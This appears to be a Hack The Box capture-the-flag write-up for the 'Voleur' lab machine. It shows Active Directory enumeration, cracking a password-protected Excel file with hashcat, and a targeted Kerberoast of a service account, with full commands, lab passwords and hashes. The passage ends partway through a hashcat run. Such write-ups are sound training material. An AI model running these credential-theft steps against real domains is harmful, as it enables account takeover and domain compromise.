---
title: "🦝 HTB Voleur Write-up"
name: Voleur
date: 2025-11-02
difficulty: Medium
os: Windows
skills: "Enumeration, Kerberoasting, Password Cracking, Tombstone Restore, DPAPI Credential Looting, Privilege Escalation"
tools: "rustscan, nmap, nxc, impacket-smbclient, BloodHound, targetedKerberoast, RunasCs, PowerView, office2john, hashcat, LibreOffice, evil-winrm, klist, ssh, scp, impacket-dpapi, impacket-secretsdump"
published: true
---

![](images/Pasted%20image%2020250713134903.png)

```
Machine Information

As is common in real life Windows pentests, you will start the Voleur box with credentials for the following account: ryan.naylor / HollowOct31Nyt
```

## 📝 Summary

I played the thief (Voleur) in this box and walked away with passwords and secrets: a password-protected Excel file, password hashes, DPAPI-protected credentials and an SSH private key.

The chain started with read access to an IT share. That share contained a password-protected Excel workbook holding account names and passwords — I cracked the workbook password with **hashcat** and pulled out credentials for `svc_ldap`. Those `svc_ldap` credentials allowed a targeted Kerberoast against `svc_winrm`, which exposed a service account usable for remote management on the server.

`svc_ldap` also had the ability to restore tombstoned/deleted accounts. I restored Todd Wolfe’s account (his pre-deletion password was stored in the Excel file) and used his access to retrieve an archived copy of his home directory. That archive contained a DPAPI-protected credential for Jeremy Combs. Jeremy could also access the same share, but had access to a saved SSH private key for `svc_backup` — the key opened an SSH service on the domain controller.

With the `svc_backup` key I accessed the DC and pulled backups (an `ntds.dit` export and registry hives), giving me the domain password hashes and a clear path to full domain compromise.

## 📄 Passwords in Excel Document

### 🔎 Recon

The **initial scan** revealed open ports for a Windows Active Directory server, including access through WinRM port `5985/tcp`.   
The scan also revealed that `OpenSSH 8.2p1` was running on port `2222/tcp`.

```
fcoomans@kali:~/htb/voleur$ rustscan -a 10.10.11.76 --tries 5 --ulimit 10000 -- -sCV -oA voleur_tcp_all
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
RustScan: Exploring the digital landscape, one IP at a time.

[~] The config file is expected to be at "/home/fcoomans/.rustscan.toml"
[~] Automatically increasing ulimit value to 10000.
Open 10.10.11.76:53
Open 10.10.11.76:88
Open 10.10.11.76:135
Open 10.10.11.76:139
Open 10.10.11.76:389
Open 10.10.11.76:445
Open 10.10.11.76:464
Open 10.10.11.76:593
Open 10.10.11.76:636
Open 10.10.11.76:2222
Open 10.10.11.76:3268
Open 10.10.11.76:3269
Open 10.10.11.76:5985
Open 10.10.11.76:9389
Open 10.10.11.76:49664
Open 10.10.11.76:49667
Open 10.10.11.76:56177
Open 10.10.11.76:61318
Open 10.10.11.76:61319
Open 10.10.11.76:61322
Open 10.10.11.76:61347
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} -{{ipversion}} {{ip}} -sCV -oA voleur_tcp_all" on ip 10.10.11.76
Depending on the complexity of the script, results may take some time to appear.
[~] Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-11 12:18 SAST

<SNIP>

Nmap scan report for 10.10.11.76
Host is up, received echo-reply ttl 127 (0.21s latency).
Scanned at 2025-07-11 12:18:10 SAST for 104s

PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-07-11 18:18:19Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: voleur.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
2222/tcp  open  ssh           syn-ack ttl 127 OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 42:40:39:30:d6:fc:44:95:37:e1:9b:88:0b:a2:d7:71 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC+vH6cIy1hEFJoRs8wB3O/XIIg4X5gPQ8XIFAiqJYvSE7viX8cyr2UsxRAt0kG2mfbNIYZ+80o9bpXJ/M2Nhv1VRi4jMtc+5boOttHY1CEteMGF6EF6jNIIjVb9F5QiMiNNJea1wRDQ2buXhRoI/KmNMp+EPmBGB7PKZ+hYpZavF0EKKTC8HEHvyYDS4CcYfR0pNwIfaxT57rSCAdcFBcOUxKWOiRBK1Rv8QBwxGBhpfFngayFj8ewOOJHaqct4OQ3JUicetvox6kG8si9r0GRigonJXm0VMi/aFvZpJwF40g7+oG2EVu/sGSR6d6t3ln5PNCgGXw95pgYR4x9fLpn/OwK6tugAjeZMla3Mybmn3dXUc5BKqVNHQCMIS6rlIfHZiF114xVGuD9q89atGxL0uTlBOuBizTaF53Z//yBlKSfvXxW4ShH6F8iE1U8aNY92gUejGclVtFCFszYBC2FvGXivcKWsuSLMny++ZkcE4X7tUBQ+CuqYYK/5TfxmIs=
|   256 ae:d9:c2:b8:7d:65:6f:58:c8:f4:ae:4f:e4:e8:cd:94 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMkGDGeRmex5q16ficLqbT7FFvQJxdJZsJ01vdVjKBXfMIC/oAcLPRUwu5yBZeQoOvWF8yIVDN/FJPeqjT9cgxg=
|   256 53:ad:6b:6c:ca:ae:1b:40:44:71:52:95:29:b1:bb:c1 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILv295drVe3lopPEgZsjMzOVlk4qZZfFz1+EjXGebLCR
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: voleur.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
56177/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
61318/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
61319/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
61322/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
61347/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: DC; OSs: Windows, Linux; CPE: cpe:/o:microsoft:windows, cpe:/o:linux:linux_kernel

<SNIP>
```

After pointing `voleur.htb` in `/etc/hosts`,

```
fcoomans@kali:~/htb/voleur$ grep voleur.htb /etc/hosts
10.10.11.76     voleur.htb
```

I ran an `nmap` UDP port scan, which detected UDP-related Windows Active Directory services.

```
fcoomans@kali:~/htb/voleur$ nmap --top-ports 100 --open -sU voleur.htb
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-11 12:25 SAST
Nmap scan report for voleur.htb (10.10.11.76)
Host is up (0.18s latency).
Not shown: 97 open|filtered udp ports (no-response)
PORT    STATE SERVICE
53/udp  open  domain
88/udp  open  kerberos-sec
123/udp open  ntp

Nmap done: 1 IP address (1 host up) scanned in 5.41 seconds
```

#### 🪟 Windows AD Recon

NetExec (`nxc`) showed that NTLM authentication was not allowed (`NTLM:False`).

```
fcoomans@kali:~/htb/voleur$ nxc smb voleur.htb -u ryan.naylor -p HollowOct31Nyt
SMB         10.10.11.76     445    10.10.11.76      [*]  x64 (name:10.10.11.76) (domain:10.10.11.76) (signing:True) (SMBv1:False) (NTLM:False)
SMB         10.10.11.76     445    10.10.11.76      [-] 10.10.11.76\ryan.naylor:HollowOct31Nyt STATUS_NOT_SUPPORTED
```

`ntpdate` was used to sync the attack host time with the Active Directory server time.  This is important as Kerberos is time sensitive.  The likelihood of Kerberos authentication on the server was high, since NTLM was not allowed.

```
fcoomans@kali:~/htb/voleur$ sudo ntpdate voleur.htb
2025-11-01 21:20:50.991944 (+0200) +28802.905807 +/- 0.090712 voleur.htb 10.10.11.76 s1 no-leap
CLOCK: time stepped by 28802.905807
```

NetExec (`nxc`) with Kerberos authentication (`-k`) was used to list the domain controllers.  The domain controller was `dc.voleur.htb`.

```
fcoomans@kali:~/htb/voleur$ nxc ldap voleur.htb --dns-server 10.10.11.76 -k -u ryan.naylor -p HollowOct31Nyt --dc-list
LDAP        voleur.htb      389    DC               [*] None (name:DC) (domain:voleur.htb)
LDAP        voleur.htb      389    DC               [+] voleur.htb\ryan.naylor:HollowOct31Nyt
LDAP        voleur.htb      389    DC               DC.voleur.htb = 10.10.11.76
```

`/etc/hosts` was updated with the new information.

```
fcoomans@kali:~/htb/voleur$ grep voleur.htb /etc/hosts
10.10.11.76     dc.voleur.htb voleur.htb
```

I also updated `/etc/krb5.conf` with the domain information which will be needed for Kerberos authentication later.

```
fcoomans@kali:~/htb/voleur$ cat /etc/krb5.conf
[libdefaults]
        default_realm = VOLEUR.HTB

# The following krb5.conf variables are only for MIT Kerberos.
        kdc_timesync = 1
        ccache_type = 4
        forwardable = true
        proxiable = true
        rdns = false


# The following libdefaults parameters are only for Heimdal Kerberos.
        fcc-mit-ticketflags = true

[realms]
        VOLEUR.HTB = {
                kdc = dc.voleur.htb
                admin_server = dc.voleur.htb
                default_domain = voleur.htb
        }

[domain_realm]
        .voleur.htb = VOLEUR.HTB
        voleur.htb = VOLEUR.HTB
```

NetExec (`nxc`) was then used to get a list of domain users.

```
fcoomans@kali:~/htb/voleur$ nxc ldap dc.voleur.htb -k -u ryan.naylor -p HollowOct31Nyt --users
LDAP        dc.voleur.htb   389    DC               [*] None (name:DC) (domain:voleur.htb)
LDAP        dc.voleur.htb   389    DC               [+] voleur.htb\ryan.naylor:HollowOct31Nyt
LDAP        dc.voleur.htb   389    DC               [*] Enumerated 11 domain users: voleur.htb
LDAP        dc.voleur.htb   389    DC               -Username-                    -Last PW Set-       -BadPW-  -Description-
LDAP        dc.voleur.htb   389    DC               Administrator                 2025-01-28 22:35:13 0        Built-in account for administering the computer/domain
LDAP        dc.voleur.htb   389    DC               Guest                         <never>             0        Built-in account for guest access to the computer/domain
LDAP        dc.voleur.htb   389    DC               krbtgt                        2025-01-29 10:43:06 0        Key Distribution Center Service Account
LDAP        dc.voleur.htb   389    DC               ryan.naylor                   2025-01-29 11:26:46 0        First-Line Support Technician
LDAP        dc.voleur.htb   389    DC               marie.bryant                  2025-01-29 11:21:07 0        First-Line Support Technician
LDAP        dc.voleur.htb   389    DC               lacey.miller                  2025-01-29 11:20:10 4        Second-Line Support Technician
LDAP        dc.voleur.htb   389    DC               svc_ldap                      2025-01-29 11:20:54 0
LDAP        dc.voleur.htb   389    DC               svc_backup                    2025-01-29 11:20:36 0
LDAP        dc.voleur.htb   389    DC               svc_iis                       2025-01-29 11:20:45 0
LDAP        dc.voleur.htb   389    DC               jeremy.combs                  2025-01-29 17:10:32 0        Third-Line Support Technician
LDAP        dc.voleur.htb   389    DC               svc_winrm                     2025-01-31 11:10:12 0
```

That I exported to the file `domain-users.txt`, which might be useful later.

```
fcoomans@kali:~/htb/voleur$ nxc ldap dc.voleur.htb -k -u ryan.naylor -p HollowOct31Nyt --users-export domain-users.txt
LDAP        dc.voleur.htb   389    DC               [*] None (name:DC) (domain:voleur.htb)
LDAP        dc.voleur.htb   389    DC               [+] voleur.htb\ryan.naylor:HollowOct31Nyt
LDAP        dc.voleur.htb   389    DC               [*] Enumerated 11 domain users: voleur.htb
LDAP        dc.voleur.htb   389    DC               -Username-                    -Last PW Set-       -BadPW-  -Description-
LDAP        dc.voleur.htb   389    DC               Administrator                 2025-01-28 22:35:13 0        Built-in account for administering the computer/domain
LDAP        dc.voleur.htb   389    DC               Guest                         <never>             0        Built-in account for guest access to the computer/domain
LDAP        dc.voleur.htb   389    DC               krbtgt                        2025-01-29 10:43:06 0        Key Distribution Center Service Account
LDAP        dc.voleur.htb   389    DC               ryan.naylor                   2025-01-29 11:26:46 0        First-Line Support Technician
LDAP        dc.voleur.htb   389    DC               marie.bryant                  2025-01-29 11:21:07 0        First-Line Support Technician
LDAP        dc.voleur.htb   389    DC               lacey.miller                  2025-01-29 11:20:10 4        Second-Line Support Technician
LDAP        dc.voleur.htb   389    DC               svc_ldap                      2025-01-29 11:20:54 0
LDAP        dc.voleur.htb   389    DC               svc_backup                    2025-01-29 11:20:36 0
LDAP        dc.voleur.htb   389    DC               svc_iis                       2025-01-29 11:20:45 0
LDAP        dc.voleur.htb   389    DC               jeremy.combs                  2025-01-29 17:10:32 0        Third-Line Support Technician
LDAP        dc.voleur.htb   389    DC               svc_winrm                     2025-01-31 11:10:12 0
LDAP        dc.voleur.htb   389    DC               [*] Writing 11 local users to domain-users.txt

fcoomans@kali:~/htb/voleur$ cat domain-users.txt
Administrator
Guest
krbtgt
ryan.naylor
marie.bryant
lacey.miller
svc_ldap
svc_backup
svc_iis
jeremy.combs
svc_winrm
```

The groups and group membership were also queried, and `Jeremy Combs` and `svc_winrm` were found to be members of `Remote Management Users`.    Both these accounts were now high-value targets, as they would give me terminal access to the server.

```
fcoomans@kali:~/htb/voleur$ nxc ldap dc.voleur.htb -k -u ryan.naylor -p HollowOct31Nyt --groups |grep -v "membercount: 0"
LDAP                     dc.voleur.htb   389    DC               [*] None (name:DC) (domain:voleur.htb)
LDAP                     dc.voleur.htb   389    DC               [+] voleur.htb\ryan.naylor:HollowOct31Nyt
LDAP                     dc.voleur.htb   389    DC               Administrators                           membercount: 3
LDAP                     dc.voleur.htb   389    DC               Users                                    membercount: 3
LDAP                     dc.voleur.htb   389    DC               Guests                                   membercount: 2
LDAP                     dc.voleur.htb   389    DC               IIS_IUSRS                                membercount: 1
LDAP                     dc.voleur.htb   389    DC               Remote Management Users                  membercount: 2
LDAP                     dc.voleur.htb   389    DC               Schema Admins                            membercount: 1
LDAP                     dc.voleur.htb   389    DC               Enterprise Admins                        membercount: 1
LDAP                     dc.voleur.htb   389    DC               Domain Admins                            membercount: 1
LDAP                     dc.voleur.htb   389    DC               Group Policy Creator Owners              membercount: 1
LDAP                     dc.voleur.htb   389    DC               Pre-Windows 2000 Compatible Access       membercount: 1
LDAP                     dc.voleur.htb   389    DC               Windows Authorization Access Group       membercount: 1
LDAP                     dc.voleur.htb   389    DC               Denied RODC Password Replication Group   membercount: 8
LDAP                     dc.voleur.htb   389    DC               First-Line Technicians                   membercount: 2
LDAP                     dc.voleur.htb   389    DC               Second-Line Technicians                  membercount: 1
LDAP                     dc.voleur.htb   389    DC               Third-Line Technicians                   membercount: 1
LDAP                     dc.voleur.htb   389    DC               Restore_Users                            membercount: 1

fcoomans@kali:~/htb/voleur$ nxc ldap dc.voleur.htb -k -u ryan.naylor -p HollowOct31Nyt --groups Administrators
LDAP        dc.voleur.htb   389    DC               [*] None (name:DC) (domain:voleur.htb)
LDAP        dc.voleur.htb   389    DC               [+] voleur.htb\ryan.naylor:HollowOct31Nyt
LDAP        dc.voleur.htb   389    DC               Domain Admins
LDAP        dc.voleur.htb   389    DC               Enterprise Admins
LDAP        dc.voleur.htb   389    DC               Administrator

fcoomans@kali:~/htb/voleur$ nxc ldap dc.voleur.htb -k -u ryan.naylor -p HollowOct31Nyt --groups "Remote Management Users"
LDAP        dc.voleur.htb   389    DC               [*] None (name:DC) (domain:voleur.htb)
LDAP        dc.voleur.htb   389    DC               [+] voleur.htb\ryan.naylor:HollowOct31Nyt
LDAP        dc.voleur.htb   389    DC               svc_winrm
LDAP        dc.voleur.htb   389    DC               Jeremy Combs

fcoomans@kali:~/htb/voleur$ nxc ldap dc.voleur.htb -k -u ryan.naylor -p HollowOct31Nyt --groups "First-Line Technicians"
LDAP        dc.voleur.htb   389    DC               [*] None (name:DC) (domain:voleur.htb)
LDAP        dc.voleur.htb   389    DC               [+] voleur.htb\ryan.naylor:HollowOct31Nyt
LDAP        dc.voleur.htb   389    DC               Marie Bryant
LDAP        dc.voleur.htb   389    DC               Ryan Naylor

fcoomans@kali:~/htb/voleur$ nxc ldap dc.voleur.htb -k -u ryan.naylor -p HollowOct31Nyt --groups "Second-Line Technicians"
LDAP        dc.voleur.htb   389    DC               [*] None (name:DC) (domain:voleur.htb)
LDAP        dc.voleur.htb   389    DC               [+] voleur.htb\ryan.naylor:HollowOct31Nyt
LDAP        dc.voleur.htb   389    DC               Lacey Miller

fcoomans@kali:~/htb/voleur$ nxc ldap dc.voleur.htb -k -u ryan.naylor -p HollowOct31Nyt --groups "Third-Line Technicians"
LDAP        dc.voleur.htb   389    DC               [*] None (name:DC) (domain:voleur.htb)
LDAP        dc.voleur.htb   389    DC               [+] voleur.htb\ryan.naylor:HollowOct31Nyt
LDAP        dc.voleur.htb   389    DC               Jeremy Combs

fcoomans@kali:~/htb/voleur$ nxc ldap dc.voleur.htb -k -u ryan.naylor -p HollowOct31Nyt --groups Restore_Users
LDAP        dc.voleur.htb   389    DC               [*] None (name:DC) (domain:voleur.htb)
LDAP        dc.voleur.htb   389    DC               [+] voleur.htb\ryan.naylor:HollowOct31Nyt
LDAP        dc.voleur.htb   389    DC               svc_ldap
```

The NetExec (`nxc`) BloodHound collector was run and the results were imported into BloodHound.

```
fcoomans@kali:~/htb/voleur$ nxc ldap dc.voleur.htb --dns-server 10.10.11.76 -k -u ryan.naylor -p HollowOct31Nyt --bloodhound -c All
LDAP        dc.voleur.htb   389    DC               [*] None (name:DC) (domain:voleur.htb)
LDAP        dc.voleur.htb   389    DC               [+] voleur.htb\ryan.naylor:HollowOct31Nyt
LDAP        dc.voleur.htb   389    DC               Resolved collection methods: psremote, dcom, acl, group, container, localadmin, rdp, trusts, session, objectprops
LDAP        dc.voleur.htb   389    DC               Using kerberos auth without ccache, getting TGT
[21:47:19] ERROR    Unhandled exception in computer DC.voleur.htb processing: The NETBIOS connection with the remote host timed out.                        computers.py:268
LDAP        dc.voleur.htb   389    DC               Done in 00M 35S
LDAP        dc.voleur.htb   389    DC               Compressing output into /home/fcoomans/.nxc/logs/DC_dc.voleur.htb_2025-11-01_214644_bloodhound.zip
```

BloodHound showed that `svc_ldap` had `WriteSPN` rights on `svc_winrm`.  `svc_ldap` was now also a high-value target...

![](images/Pasted%20image%2020251101140902.png)

I then enumerated the shares using NetExec (`nxc`) and found that Ryan had read access to the `IT` share.

```
fcoomans@kali:~/htb/voleur$ nxc smb dc.voleur.htb -k -u ryan.naylor -p HollowOct31Nyt --shares
SMB         dc.voleur.htb   445    dc               [*]  x64 (name:dc) (domain:voleur.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc.voleur.htb   445    dc               [+] voleur.htb\ryan.naylor:HollowOct31Nyt
SMB         dc.voleur.htb   445    dc               [*] Enumerated shares
SMB         dc.voleur.htb   445    dc               Share           Permissions     Remark
SMB         dc.voleur.htb   445    dc               -----           -----------     ------
SMB         dc.voleur.htb   445    dc               ADMIN$                          Remote Admin
SMB         dc.voleur.htb   445    dc               C$                              Default share
SMB         dc.voleur.htb   445    dc               Finance
SMB         dc.voleur.htb   445    dc               HR
SMB         dc.voleur.htb   445    dc               IPC$            READ            Remote IPC
SMB         dc.voleur.htb   445    dc               IT              READ
SMB         dc.voleur.htb   445    dc               NETLOGON        READ            Logon server share
SMB         dc.voleur.htb   445    dc               SYSVOL          READ            Logon server share
```

#### 🛈 An Excel file is not a password vault!

`impacket-smbclient` was used with Kerberos authentication (`-k`) to access the shares on the server.  I found the file `First-Line Support/Access_Review.xlsx` under the `IT` share and downloaded it.

```
fcoomans@kali:~/htb/voleur$ impacket-smbclient -k 'voleur.htb/ryan.naylor:HollowOct31Nyt@dc.voleur.htb'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

Type help for list of commands
# shares
ADMIN$
C$
Finance
HR
IPC$
IT
NETLOGON
SYSVOL
# use IT
# tree
/First-Line Support/Access_Review.xlsx
Finished - 2 files and folders
# get /First-Line Support/Access_Review.xlsx
# !ls Access*
Access_Review.xlsx

# exit
```

The file was password-protected, and I used `office2john` to extract the password hash.

```
fcoomans@kali:~/htb/voleur$ office2john Access_Review.xlsx |tee access_review.hash
Access_Review.xlsx:$office$*2013*100000*256*16*a80811402788c037b50df976864b33f5*500bd7e833dffaa28772a49e987be35b*7ec993c47ef39a61e86f8273536decc7d525691345004092482f9fd59cfa111c
```

I then removed the filename from the hash and asked `hashcat` to `--identify` the hash.  It found that it was an `MS Office 2013` hash and that mode `9600` could be used to crack the hash.

```
fcoomans@kali:~/htb/voleur$ vim access_review.hash

fcoomans@kali:~/htb/voleur$ cat access_review.hash
$office$*2013*100000*256*16*a80811402788c037b50df976864b33f5*500bd7e833dffaa28772a49e987be35b*7ec993c47ef39a61e86f8273536decc7d525691345004092482f9fd59cfa111c

fcoomans@kali:~/htb/voleur$ hashcat --identify access_review.hash
The following hash-mode match the structure of your input hash:

      # | Name                                                       | Category
  ======+============================================================+======================================
   9600 | MS Office 2013                                             | Document
```

`hashcat` was used with the `rockyou.txt` wordlist to crack the hash.  The password to unlock the file was `football1`.

```
fcoomans@kali:~/htb/voleur$ hashcat -m 9600 access_review.hash /usr/share/wordlists/rockyou.txt
hashcat (v7.1.2) starting

<SNIP>

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$office$*2013*100000*256*16*a80811402788c037b50df976864b33f5*500bd7e833dffaa28772a49e987be35b*7ec993c47ef39a61e86f8273536decc7d525691345004092482f9fd59cfa111c:football1

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 9600 (MS Office 2013)
Hash.Target......: $office$*2013*100000*256*16*a80811402788c037b50df97...fa111c

<SNIP>
```

I used the password to open the Excel document in LibreOffice.  And what do you know, it contained the password for `svc_ldap`!  The password was `M1XyC9pW7qT5Vn`.  
It also contained a password for Todd, but that account was deleted.

![](images/Pasted%20image%2020250713135204.png)

NetExec (`nxc`) confirmed that the password was valid.

```
fcoomans@kali:~/htb/voleur$ nxc ldap dc.voleur.htb -k -u svc_ldap -p M1XyC9pW7qT5Vn
LDAP        dc.voleur.htb   389    DC               [*] None (name:DC) (domain:voleur.htb)
LDAP        dc.voleur.htb   389    DC               [+] voleur.htb\svc_ldap:M1XyC9pW7qT5Vn
```

### 🧪 Exploitation

#### 🍖 Kerberoasting svc_winrm

BloodHound mentioned that I had to download `targetedKerberoast` to perform a Kerberoast attack on `svc_winrm`.

![](images/Pasted%20image%2020251101140902.png)

I cloned the repository from https://github.com/ShutdownRepo/targetedKerberoast

```
fcoomans@kali:~/htb/voleur$ git clone https://github.com/ShutdownRepo/targetedKerberoast.git
Cloning into 'targetedKerberoast'...
remote: Enumerating objects: 76, done.
remote: Counting objects: 100% (33/33), done.
remote: Compressing objects: 100% (19/19), done.
remote: Total 76 (delta 19), reused 18 (delta 14), pack-reused 43 (from 1)
Receiving objects: 100% (76/76), 252.27 KiB | 19.41 MiB/s, done.
Resolving deltas: 100% (30/30), done.
```

And set up a Python virtual environment for the program.  
I activated the virtual environment and installed the modules needed to get `targetedkerberoast` working.

```
fcoomans@kali:~/htb/voleur/targetedKerberoast$ python -m venv targetedKerberoast

fcoomans@kali:~/htb/voleur/targetedKerberoast$ . ./targetedKerberoast/bin/activate

(targetedKerberoast)fcoomans@kali:~/htb/voleur/targetedKerberoast$ pip install -r requirements.txt
Collecting ldap3 (from -r requirements.txt (line 1))
  Using cached ldap3-2.9.1-py2.py3-none-any.whl.metadata (5.4 kB)
Collecting pyasn1 (from -r requirements.txt (line 2))

<SNIP>
```

I used `impacket-getTGT` to get a Kerberos Ticket Granting Ticket (TGT) for `svc_ldap`.

```
(targetedKerberoast)fcoomans@kali:~/htb/voleur/targetedKerberoast$ impacket-getTGT -dc-ip 10.10.11.76 'voleur.htb/svc_ldap:M1XyC9pW7qT5Vn'
/home/fcoomans/htb/voleur/targetedKerberoast/targetedKerberoast/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in svc_ldap.ccache

(targetedKerberoast)fcoomans@kali:~/htb/voleur/targetedKerberoast$ export KRB5CCNAME=svc_ldap.ccache

(targetedKerberoast)fcoomans@kali:~/htb/voleur/targetedKerberoast$ klist
Ticket cache: FILE:svc_ldap.ccache
Default principal: svc_ldap@VOLEUR.HTB

Valid starting       Expires              Service principal
11/01/2025 22:43:58  11/02/2025 08:43:58  krbtgt/VOLEUR.HTB@VOLEUR.HTB
        renew until 11/02/2025 22:40:47
```

`targetedKerberoast` was then used to Kerberoast `svc_winrm`.

```
(targetedKerberoast)fcoomans@kali:~/htb/voleur/targetedKerberoast$ python targetedKerberoast.py -k --dc-host dc.voleur.htb -d voleur.htb -u svc_ldap --request-user svc_winrm -f hashcat -o kerberoast.hash
[*] Starting kerberoast attacks
[*] Attacking user (svc_winrm)
[+] Writing hash to file for (svc_winrm)

(targetedKerberoast)fcoomans@kali:~/htb/voleur/targetedKerberoast$ deactivate
```

This was the password hash for `svc_winrm` password.

```
fcoomans@kali:~/htb/voleur/targetedKerberoast$ cat kerberoast.hash
$krb5tgs$23$*svc_winrm$VOLEUR.HTB$voleur.htb/svc_winrm*$419ba18707ce71506f79e009763f2d83$829b8c16a5bf4c5df189d9c3794135d95ca50ca0573546295cb877763db7108fc047fcb8a3596135ba1184d68f62b1e188fea016a09562089a3fbfd07a97bb2c1eb0cbbf40ed56e1677a71ecdb0d1f41cec7d93d81a3c5c27039e7b1716c607f55bd238537db28d5bdd7d7c021c36b5fb81ab1d2c8d7363585b93ff9c47b1ad99209fe9f8a78815677f94c8d5083e4fcb136172cb765a49eec186576bc1bc9eaaf602d35e5ee14add8636c669a856fd6ec1f77714c3d545b6bda62644dfe77aab50044da67711b3fd53da84c46664b4bb7a1ffe5352778e340c6a718e630fe0636b897273529aef49a5abde469ad191137e963aeeb5b4c85c15eb510e35428038739c2b96dda5a2e2b175804cbe8ee49c27a64f7c40bd01f557f18e021815feee8b5c76bee060f0cd70f2659662e773d989436c23fe187de375106a204bbcce2a6aa3eaa7d6b52c0c45f3a3fad441765d159400b12e14dfaf800f0ce65f44df4dcbf4a2df2c057714cab20ba3bf6b68a7517cdb1bfbf903521999ca693d7b3da70745726e2232f38c094ee8357580a59450331c087cc4457a179cde548881dcaf387858cc2da51bd88608dedcef896971b348f07a80cdde65a9ea0e56257c7b2e84e29287b986ce60e3f462d07db8bccfb11063a31efa43bf2428a6d6e5e43fbffddb791e0a8338a017d9e92f8592bf3a1ace7ff224d0d47289ceef453e232042c8978bfbf0a2703267ef24d33ad3a475b4221f722a76c645fbf4355f31a7fab1d5126ee26f0768695a2d2e9e9080ae4dc8ec5d53f6faae7d2dc822b43fbff63ea06c16d5b3d98d4d8a2a33b7188484b6f9324de1889f8c01c4b2b77ee1a02ef8daac45e0d07233aefd22994e2b63a0da3649cafaf9401d9d6ce0ecac1dea1bba2268295ccb8f81d2344097647516c69d4f94cb07a5e4d855c4d09eb9883df6fabd18ff9a29e2b130ec82d52707afd7eb7424c3d624595d7b1cc8685fc750641c53a3dfa8e00ff2f963734abf37217366334967d29f6347743cb590c2e5fc87641c9c23f89d35b9ab140be3c132b82684dc71d5d1d4edf19b3c4f6dd92c26ce613c12836b5fc77a9217e4943d2e55f80e6d77f914cdcb143414ddf7f4e2e719ea89760ad1b73faff4e561176a678147d602e6ab3a08e4d90e0904bc1354784908a2d1a35192a40f75ddff140969dc847c949138f6934cce442cf9ee8bc85b0739cea53cf124dc74bd6d71c7dc7eec0060044d81b0b0b4e7258f1d1db4b038af3bb23125406092b0b6b0f30ac97bf22d1ff32375f88bd216ca831ce3cbbb0e372c325f50b2d469e6a3dd31e028fb0f904f6826cae71cf5c80800d878c326089584da9f8d0bad49c119fcbdd152fb6d62db2f70572434a21de718c5da09ef884c601d51ccb99444638def8d36d570f1ebe863596df5d346a9e08492228993313220aeb0a6e33d3d16e0bd74b9184b78cc06be178
```

`hashcat` identified the hash as a `Kerberos 5, etype 23, TGS-REP` hash and indicated that mode `13100` had to be used to crack the hash.

```
fcoomans@kali:~/htb/voleur/targetedKerberoast$ hashcat --identify kerberoast.hash
The following hash-mode match the structure of your input hash:

      # | Name                                                       | Category
  ======+============================================================+======================================
  13100 | Kerberos 5, etype 23, TGS-REP                              | Network Protocol
```

`hashcat` was then used with the `rockyou.txt` wordlist to crack the password hash.  The password was `AFireInsidedeOzarctica980219afi`.
 
```
fcoomans@kali:~/htb/voleur/targetedKerberoast$ hashcat -m 13100 kerberoast.hash /usr/share/wordlists/rockyou.txt
hashcat (v7.1.2) starting

<SNIP>

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

